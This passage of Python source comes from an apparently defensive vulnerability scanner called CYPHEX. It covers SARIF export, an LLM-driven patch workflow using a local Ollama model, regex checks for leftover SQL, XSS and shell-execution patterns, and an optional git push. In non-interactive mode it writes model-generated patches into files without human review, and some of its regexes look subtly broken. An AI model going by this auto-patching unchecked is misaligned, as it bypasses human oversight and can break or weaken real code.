            rule_id = (v.get("name") or "CYPHEX-FINDING").upper().replace(" ", "-")
            results.append({
                "ruleId": rule_id,
                "level": "error" if v.get("severity") in ("Critical", "High") else "warning",
                "message": {"text": f"{v.get('name')} at {v.get('endpoint')}"},
                "locations": [{
                    "physicalLocation": {"artifactLocation": {"uri": v.get("endpoint") or "unknown"}}
                }],
            })

        sarif_doc = {
            "version": "2.1.0",
            "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
            "runs": [{"tool": {"driver": {"name": "CYPHEX"}}, "results": results}],
        }
        with open(sarif_path, "w", encoding="utf-8") as f:
            json.dump(sarif_doc, f, indent=2)

        print(f"  {C.G}[OK]{C.RST} Judge artifacts exported:")
        print(f"      - {json_path}")
        print(f"      - {md_path}")
        print(f"      - {sarif_path}")

    # Step 8: Patch workflow
    async def _patch_workflow(self):
        vulns = [v for v in self.context.confirmed_vulns if v.severity in ("Critical", "High")]
        if not vulns:
            print(f"  {C.G}No critical/high vulns to patch.{C.RST}")
            return

        print(f"\n  {C.BOLD}Found {len(vulns)} Critical/High vulnerabilities to review.{C.RST}")
        print(f"  {C.DIM}For each vuln: unsafe reason -> patch -> safety notes.{C.RST}\n")

        patched_files = []
        skipped = 0

        for i, v in enumerate(vulns, 1):
            if ":" not in (v.endpoint or ""):
                continue

            parts = v.endpoint.split(":")
            rel_path = parts[0].strip()
            try:
                line_num = int(parts[1].split()[0])
            except Exception:
                continue

            filepath = os.path.join(self.source_dir, rel_path)
            if not os.path.exists(filepath):
                continue

            try:
                with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                    lines = f.readlines()
            except Exception:
                continue

            sev_color = C.R if v.severity == "Critical" else C.Y
            print(f"  {sev_color}{'-' * 70}{C.RST}")
            print(f"  {sev_color}[{i}/{len(vulns)}] {v.name} ({v.severity}){C.RST}")
            print(f"  File: {C.CY}{rel_path}:{line_num}{C.RST}")

            start_l = max(0, line_num - 3)
            end_l = min(len(lines), line_num + 2)
            snippet = "".join(lines[start_l:end_l])

            print(f"\n  {C.BOLD}Vulnerable Code:{C.RST}")
            for j in range(start_l, end_l):
                ln = j + 1
                marker = "->" if ln == line_num else "  "
                print(f"  {marker} {ln:4} | {lines[j].rstrip()[:120]}")

            patch_pkg = await self._get_llm_fix_package(v, snippet, rel_path)
            if not patch_pkg:
                print(f"\n  {C.Y}[SKIP]{C.RST} Could not generate patch package\n")
                skipped += 1
                continue

            print(f"\n  {C.BOLD}Why This Is Unsafe:{C.RST}")
            print(f"  {patch_pkg.get('unsafe_reason', 'No rationale provided.')}")

            fixed = patch_pkg.get("fixed_code", "").strip()
            if not fixed:
                print(f"\n  {C.Y}[SKIP]{C.RST} Model did not return fixed code\n")
                skipped += 1
                continue

            safety_notes = self._assess_patch_safety(v, snippet, fixed)
            llm_patch_safety = patch_pkg.get("patch_safety", "").strip()

            print(f"\n  {C.BOLD}Proposed Fix (diff):{C.RST}")
            for ol in snippet.split("\n"):
                if ol.strip():
                    print(f"  {C.R}- {ol[:120]}{C.RST}")
            for nl in fixed.split("\n"):
                if nl.strip():
                    print(f"  {C.G}+ {nl[:120]}{C.RST}")

            print(f"\n  {C.BOLD}Patch Safety Notes:{C.RST}")
            if llm_patch_safety:
                print(f"  Model: {llm_patch_safety}")
            for note in safety_notes:
                print(f"  - {note}")

            if self.non_interactive:
                choice = "y"
                print(f"\n  {C.DIM}non-interactive mode: auto applying patch{C.RST}")
            else:
                print(f"\n  {C.Y}Apply this patch? (y/n/q):{C.RST} ", end="")
                try:
                    choice = input().strip().lower()
                except EOFError:
                    choice = "n"

            if choice == "q":
                break
            if choice != "y":
                skipped += 1
                print(f"  {C.DIM}[SKIPPED]{C.RST}\n")
                continue

            for j in range(start_l, end_l):
                lines[j] = ""
            lines[start_l] = fixed + "\n"
            with open(filepath, "w", encoding="utf-8") as f:
                f.writelines(lines)
            patched_files.append(rel_path)
            print(f"  {C.G}[APPLIED]{C.RST} Patch applied to {rel_path}\n")

        print(f"\n  {C.BOLD}{'-' * 50}{C.RST}")
        print(f"  {C.G}Applied:{C.RST} {len(patched_files)}  {C.Y}Skipped:{C.RST} {skipped}")

        if patched_files and self.repo_url and not self.non_interactive:
            print(f"\n  {C.Y}Push patches to GitHub? (y/n):{C.RST} ", end="")
            try:
                push = input().strip().lower()
            except EOFError:
                push = "n"
            if push == "y":
                self._push_to_github()

    async def _get_llm_fix_package(self, vuln, code_snippet, filepath) -> Optional[dict[str, str]]:
        """Ask local Ollama model for unsafe reason + patch + safety rationale."""
        model_name = os.getenv("OLLAMA_MODEL", "qwen2.5-coder:7b")
        prompt = (
            "You are a secure code patch assistant. Return valid JSON only with keys: "
            "unsafe_reason, fixed_code, patch_safety. "
            "Explain concretely why original code is unsafe, then provide a safe patch.\n\n"
            f"Vulnerability: {vuln.name}\n"
            f"File: {filepath}\n"
            "Original code:\n"
            f"{code_snippet}\n"
        )

        try:
            async with httpx.AsyncClient(timeout=90) as client:
                resp = await client.post(
                    "http://localhost:11434/api/generate",
                    json={"model": model_name, "prompt": prompt, "stream": False},
                )
                if resp.status_code != 200:
                    return None

                raw = resp.json().get("response", "").strip()
                parsed = self._extract_json_object(raw)
                if isinstance(parsed, dict):
                    return {
                        "unsafe_reason": str(parsed.get("unsafe_reason", "")).strip(),
                        "fixed_code": str(parsed.get("fixed_code", "")).strip(),
                        "patch_safety": str(parsed.get("patch_safety", "")).strip(),
                    }

                # Fallback: treat response as code-only patch
                m = re.search(r"```(?:\\w+)?\\n(.*?)```", raw, re.DOTALL)
                fixed = m.group(1).strip() if m else raw
                if fixed:
                    return {
                        "unsafe_reason": "Model returned code without structured rationale.",
                        "fixed_code": fixed,
                        "patch_safety": "Review manually before merge.",
                    }
        except Exception as e:
            print(f"  {C.R}[ERR]{C.RST} Ollama patch request failed: {str(e)[:80]}")
            print(f"  {C.DIM}Run: ollama serve && ollama pull {model_name}{C.RST}")

        return None

    def _extract_json_object(self, text: str) -> Optional[dict[str, Any]]:
        text = text.strip()
        if not text:
            return None
        if text.startswith("```"):
            text = re.sub(r"^```[a-zA-Z0-9_-]*\\n", "", text)
            text = re.sub(r"\\n```$", "", text)
        try:
            obj = json.loads(text)
            if isinstance(obj, dict):
                return obj
        except Exception:
            pass
        m = re.search(r"\{[\s\S]*\}", text)
        if not m:
            return None
        try:
            obj = json.loads(m.group(0))
            return obj if isinstance(obj, dict) else None
        except Exception:
            return None

    def _assess_patch_safety(self, vuln, original: str, fixed: str) -> list[str]:
        """Lightweight static checks that compare risky patterns before/after."""
        notes = []
        lowered = (vuln.name or "").lower()

        if "sql" in lowered:
            if re.search(r"SELECT|INSERT|UPDATE|DELETE", original, re.IGNORECASE) and not re.search(r"\?|%s|execute\([^\)]*,", fixed):
                notes.append("Patch may still build SQL dynamically; prefer parameterized queries.")
            else:
                notes.append("Patch appears to move toward parameterized SQL handling.")

        if "xss" in lowered:
            if "innerHTML" in fixed and "sanitize" not in fixed.lower():
                notes.append("Patch still uses innerHTML without explicit sanitization.")
            else:
                notes.append("Patch appears to reduce direct script injection risk.")

        if "command" in lowered:
            if re.search(r"exec\(|system\(|shell=True", fixed):
                notes.append("Patch still uses shell execution primitives; review command construction.")
            else:
                notes.append("Patch appears to reduce shell injection surface.")

        if not notes:
            notes.append("Manual review required: heuristic safety check had no specific rule for this vuln type.")

        return notes

    def _push_to_github(self):
        try:
            for cmd in [["git","add","-A"],["git","commit","-m","fix: CYPHEX auto-patched security vulnerabilities"],["git","push"]]:
                r = subprocess.run(cmd, cwd=self.source_dir, capture_output=True, text=True)
                if r.returncode != 0:
                    print(f"  {C.R}[ERR]{C.RST} {' '.join(cmd)}: {r.stderr[:100]}")
                    return
            print(f"  {C.G}[OK]{C.RST} Patches pushed to GitHub!")
        except Exception as e:
            print(f"  {C.R}[ERR]{C.RST} Push failed: {e}")

    def _final_banner(self):
        print(f"\n{C.CY}{'='*60}{C.RST}")
        print(f"  {C.G}CYPHEX scan complete.{C.RST}")
        print(f"  {C.DIM}All phases finished. Sandbox cleaned up.{C.RST}")
        print(f"{C.CY}{'='*60}{C.RST}\n")



